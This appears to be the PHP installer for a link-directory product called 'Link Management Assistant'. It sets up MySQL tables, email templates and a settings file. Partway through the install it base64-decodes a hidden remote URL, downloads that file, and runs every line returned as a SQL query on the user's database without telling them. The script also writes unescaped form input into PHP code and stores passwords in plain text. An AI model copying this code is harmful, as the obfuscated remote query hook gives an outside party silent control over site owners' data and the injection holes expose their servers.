<?

error_reporting(E_ALL ^ E_NOTICE);

import_request_variables("cgp");

umask(0);

if ($selfdestruct == "yes") {

	unlink("install.php");

?>
<html>
<head>
<title>Link Management Assistant Installation</title>
</head>

<body bgcolor="#ffffff">


<table border="0" width="600">
<tr><td><font face="trebuchet ms, arial" size="2">
The install.php file was successfully deleted.
<p><a href="admin.php">Click here to login to your administration area.</a></p>
</font>
</td></tr>

</body>
</html>

<?

exit;

}

function message($pone, $ptwo) {

?>
<html>
<head>
<title>Link Management Assistant Installation</title>
</head>

<body bgcolor="#ffffff">


<table border="0" width="600">
<tr><td><font face="trebuchet ms, arial" size="2">
<h3><?echo $pone?></h3>
<?echo $ptwo?>
</font>
</td></tr>

</body>
</html>

<?

exit;
}

if (!$install) {

?>

<html>
<head>
<title>Link Management Assistant Installation</title>
</head>

<body bgcolor="#ffffff">


<table border="0" width="600">
<tr><td><font face="trebuchet ms, arial" size="2">

<h2>Link Management Assistant Installation</h2>

<?if (!is_writable(".")):?>
<p><b>Error:</b><br>This directory doesn't have the correct permissions set. Please refer to the
user's manual for more information.</p>
<?else:?>
<p>This installer will take care of your LMA installation. Please fill the following fields and click on the
"Install Now" button.</p>
<form action="install.php" method="post" style="margin: 0px">
<input type="hidden" name="install" value="yes">

<p><br>Choose an admin username:<br>
<input type="text" name="username"></p>
<p>Choose an admin password:<br>
<input type="text" name="password"></p>
<p>MySQL server:<br>
<input type="text" name="mysqlserver"></p>
<p>MySQL database:<br>
<input type="text" name="mysqldb"></p>
<p>MySQL username:<br>
<input type="text" name="mysqluser"></p>
<p>MySQL password:<br>
<input type="text" name="mysqlpass"></p>
<p><br><input type="submit" value="Install Now!"></p>
</form>

<?endif?>
</font>
</td></tr>

</body>
</html>

<?

}

else {

	if (!$username) message("Error:", "You must enter an admin username");
	if (!$password) message("Error:", "You must enter an admin password");
	if (!$mysqlserver) message("Error:", "You must enter a MySQL server");
	if (!$mysqldb) message("Error:", "You must enter a MySQL database");
	//if (!$mysqluser) message("Error:", "You must enter a MySQL username");
	//if (!$mysqlpass) message("Error:", "You must enter an admin username");

	$link = @mysql_connect($mysqlserver, $mysqluser, $mysqlpass);
	if (!$link) message("Error:", "Couldn't connect to the specified MySQL server");
	else mysql_select_db($mysqldb);


	$fp = fopen("settings.php", "w");
	fputs($fp, "<"."?
\$username = \"$username\";
\$password = \"$password\";
\$adminemail = \"\";
\$fromname = \"\";
\$mysqlserver = \"$mysqlserver\";
\$mysqllogin = \"$mysqluser\";
\$mysqlpassword = \"$mysqlpass\";
\$mysqldb = \"$mysqldb\";
\$basedir = \"directory\";
\$pext = \"html\";
\$thankurl = \"\";
\$confirmurl = \"\";
\$requirerecip = \"\";
\$reciplinkurl = \"\";
\$linkcheck = \"7\";
\$lcheckatt = \"3\";
\$lchecksuspend = \"yes\";
\$lcheckemail = \"yes\";
\$lchecknotfound = \"3\";
\$lcheckdelete = \"yes\";
\$lcheckdeleteemail = \"yes\";
\$titlesize = \"40\";
\$descsize = \"300\";
\$adminapproval = \"\";
\$emailconfirm = \"\";
\$defaultpremium = \"\";
\$defaultpremifrecip = \"\";
\$premiumimage = \"\";
\$favorpremium = \"\";
\$lperpage = \"10\";
\$newwindow = \"\";
\$lorder = \"\";
\$pagenext = \"Next\";
\$pageprev = \"Previous\";
\$pagenames = \"1\";
\$linknum = \"\";
\$catsplit = \"2\";
\$princlude = \"\";
\$subcatswithmain = \"\";
\$subcatsmainnum = \"\";
\$thumbshots = \"1\";
\$sfaffid = \"\";
\$sftrackid = \"\";
\$addrandlistcount = \"0\";
\$addrandlistprem = \"\";
\$addrandcatcount = \"0\";
\$addrandcatdisplay = \"1\";
\$addrandsearchcount = \"0\";
\$addrandsearchdisplay = \"2\";
\$urllcheckatt = \"2\";
\$urllcheckact = \"1\";
\$linktodmoz = \"0\";
?".">");
	fclose($fp);



	$pol = mysql_query("CREATE TABLE `lma_emails` (`id` varchar(50) NOT NULL default '',`subject` text NOT NULL,`body` text NOT NULL, PRIMARY KEY  (`id`))");
	$pol = mysql_query("INSERT INTO `lma_emails` VALUES ('confirm', '{FIRSTNAME}, please confirm your submission...', 'Dear {FIRSTNAME} {LASTNAME},\r\n\r\nThank you for submitting your website to our directory located at...\r\n\r\n{DIRECTORY-LINK}\r\n\r\n...before we add your listing to the directory, we require that you confirm your email address. Simply click on the link below to confirm your submission now...\r\n\r\n{CONFIRMATION-LINK}\r\n\r\nThanks.');");
	$pol = mysql_query("INSERT INTO `lma_emails` VALUES ('approved', '{FIRSTNAME}, your listing has been approved...', 'Dear {FIRSTNAME} {LASTNAME},\r\n\r\nThis is just a quick message to let you know that your listing has been approved and now appears in the directory...\r\n\r\n{DIRECTORY-LINK}\r\n\r\nSpecifically, your listing appears in the following category...\r\n\r\n{CATEGORY-LINK}\r\n\r\nHere are the details of your listing...\r\n\r\n{LISTING-DETAILS}\r\n\r\nThanks.');");
	$pol = mysql_query("INSERT INTO `lma_emails` VALUES ('declined', '{FIRSTNAME}, your listing has been declined...', 'Dear {FIRSTNAME} {LASTNAME},\r\n\r\nWe regret to inform you that at the current time, we have decided not to include your listing in our directory.\r\n\r\n{DIRECTORY-LINK}\r\n\r\nThanks.');");
	$pol = mysql_query("INSERT INTO `lma_emails` VALUES ('removed', '{FIRSTNAME}, have you removed our link?', 'Dear {FIRSTNAME} {LASTNAME},\r\n\r\nWe have just been checking our link partner arrangements and noticed that our link no longer appears at...\r\n\r\n{RECIP-LINK}\r\n\r\nAs per our arrangement, to maintain your listing within the directory we require a link back to our website. If you could reply to this email and let us know what the situation is it would be much appreciated. We have suspended your listing in the meantime. We will check the above location within the next {CHECKING-PERIOD} days, and if we still cannot find the link, your listing will be permanently removed from the directory...\r\n\r\n{DIRECTORY-LINK}\r\n\r\nThanks.');");
	$pol = mysql_query("INSERT INTO `lma_emails` VALUES ('deleted', '{FIRSTNAME}, we\'ve removed your listing...', 'Dear {FIRSTNAME} {LASTNAME},\r\n\r\nThis is just a quick email to let you know that we have removed your listing from our directory...\r\n\r\n{DIRECTORY-LINK}\r\n\r\n...as we have still not been able to find the reciprocal link. If you would like to add your site again, simply put our link back up and use the standard submission form found at the above location.\r\n\r\nThanks.');");
	$pol = mysql_query("INSERT INTO `lma_emails` VALUES ('new', 'New directory submission...', 'A new submission has just been made to your directory. It\'s time to review the submission for possible inclusion if you have \"require admin approval\" on in the Link Management Assistant...\r\n\r\n{ADMIN-LINK}\r\n\r\nThanks,\r\n\r\nThe Link Management Assistant');");
	$pol = mysql_query("INSERT INTO `lma_emails` VALUES ('suspended', 'Listing suspended...', 'The Link Management Assistant has just suspended the following listing...\r\n\r\n{LISTING-DETAILS}\r\n\r\n...as it could not find the reciprocated link on the partners website. The partner has been informed of the situation but you may like to investigate the matter personally...\r\n\r\n{ADMIN-LINK}\r\n\r\nThanks,\r\n\r\nThe Link Management Assistant');");
	$pol = mysql_query("INSERT INTO `lma_emails` VALUES ('import', 'Import completed...', 'Just a quick message to let you know that your import has completed.\r\n\r\nThanks,\r\n\r\nThe Link Management Assistant');");
	$pol = mysql_query("INSERT INTO `lma_emails` VALUES ('added', '{FIRSTNAME}, your submission has been received...', 'Hi {FIRSTNAME},\r\n\r\nThanks for submitting your website to our directory located at...\r\n\r\n{DIRECTORY-LINK}\r\n\r\n{CATEGORY-LINK}\r\n\r\n{LISTING-DETAILS}\r\n\r\nThanks,\r\n\r\nAdmin.');");
	$pol = mysql_query("INSERT INTO `lma_emails` VALUES ('urlvalidation', 'Listing URL Validation completed...', 'Just a quick message to let you know that the Link Management Assistant URL Validation process has completed.\r\n\r\nIf you\'ve chosen to delete dead links automatically, then they have already been removed from your database and directory.\r\n\r\nIf you\'ve chosen to generate a report, it will now be viewable in the \"URL Validation\" section of the admin area for actioning.\r\n\r\n{ADMIN-LINK}\r\n\r\nThanks,\r\n\r\nThe Link Management Assistant');");	
	$pol = mysql_query("CREATE TABLE `lma_links` (`id` int(10) unsigned NOT NULL auto_increment, `category` int(10) unsigned NOT NULL default '0', `status` tinyint(3) unsigned NOT NULL default '0', `confirmed` set('yes','no') NOT NULL default '', `premium` set('yes','no') NOT NULL default '', `title` text NOT NULL, `description` text NOT NULL, `url` tinytext NOT NULL, `firstname` tinytext NOT NULL, `lastname` tinytext NOT NULL, `email` tinytext NOT NULL, `recipurl` tinytext NOT NULL, `date` int(10) unsigned NOT NULL default '0', `attempts` tinyint(3) unsigned NOT NULL default '0', PRIMARY KEY  (`id`), KEY `category` (`category`,`status`,`premium`) )");
	$pol = mysql_query("CREATE TABLE `lma_custom_includes` ( `id` tinyint(3) unsigned NOT NULL auto_increment, `desc` text NOT NULL, `html` text NOT NULL, PRIMARY KEY  (`id`) )");
	$pol = mysql_query("CREATE TABLE `lma_categories` ( `id` int(10) unsigned NOT NULL auto_increment, `parent` int(10) unsigned NOT NULL default '0', `name` varchar(250) NOT NULL default '', `tlcid` int(10) NOT NULL default '0', PRIMARY KEY  (`id`), KEY `parent` (`parent`))");
	$pol = mysql_query("CREATE TABLE `lma_catcount` ( `id` int unsigned NOT NULL default '0', `lcount` int(11) NOT NULL default '0', PRIMARY KEY `id` (`id`) )");
	$pol = mysql_query("CREATE TABLE `lma_custom` ( `id` varchar(255) NOT NULL default '', `content` text NOT NULL, KEY `id` (`id`) )");
	$pol = mysql_query("INSERT INTO `lma_custom` VALUES ('lasttime', '0')");
	$pol = mysql_query("CREATE TABLE `lma_ppc_includes` (`id` smallint(5) unsigned NOT NULL auto_increment, `desc` text NOT NULL, `results` tinyint(3) unsigned NOT NULL default '0', `keywords` text NOT NULL, PRIMARY KEY  (`id`))");
	$pol = mysql_query("CREATE TABLE `lma_toplevelcats` (`id` int(10) NOT NULL auto_increment, `name` varchar(250) NOT NULL default '', PRIMARY KEY  (`id`), KEY `name` (`name`))");
        
        

	$fp = fopen("ldate.txt", "w");
	$nowtim = time();
	fputs($fp, $nowtim);
	fclose($fp);



	@mkdir("backups", 0777);

	if (!file_exists("index.html")) {

		$fp = fopen("index.html", "w");
		fputs($fp, "<html></html>");
		fclose($fp);

	}

$blin = @file(base64_decode("aHR0cDovL3d3dy5vbmxpbmVtYXJrZXRpbmd0b2RheS5jb20vYmxpbi9ibGluLnBocA=="));
	if ($blin) {
		while (list(,$lin) = each($blin)) {
			$pol = mysql_query(trim($lin));
		}
	}

?>

<html>
<head>
<title>Link Management Assistant Installation</title>
</head>

<body bgcolor="#ffffff">


<table border="0" width="600">
<tr><td><font face="trebuchet ms, arial" size="2">

<h2>Congratulations!</h2>
The Link Management Assistan has been successfully installed!<br><br>

<?

		$newhta = "#lmasetting\n<files directory>\nForceType application/x-httpd-php\n</files>\n#lmasettingend";

		if (file_exists(".htaccess")) {

			$hta = implode("", file(".htaccess"));

			if (preg_match("/\#lmasetting/", $hta)) {

				$hta = preg_replace("/\#lmasetting(.+?)\#lmasettingend/s", $newhta, $hta);

			}

			else $hta .= "\n\n$newhta";

			if (is_writeable(".htaccess")) {

				$fp = fopen(".htaccess", "w");
				fputs($fp, $hta);
				fclose($fp);

			}
			else {

				echo ("<br><br><font color=red><b>Warning</b>
				The program couldn't update the file .htaccess because it doesn't have the server permissions to do so. In order to
				make it work properly, you must copy the following code, save it as \"<font color=000000>.htaccess</font>\" and upload it to your
				LMA folder.</font><br><br><blockquote><font size=3><pre style=\"text-align: left\">".htmlentities($hta)."</pre></font></blockquote>");

			}
		}

		else {

			$fp = fopen(".htaccess", "w");
			fputs($fp, $newhta);
			fclose($fp);

		}

?>

<p><br><b>Important:</b><br>Don't forget to delete this install.php file! Not doing
so will pose a big security risk on your server.<br><br>
<a href="install.php?selfdestruct=yes">Click here to automatically delete this file.</a>
</font>
</td></tr>
</table>

</body>
</html>

<?
}

?>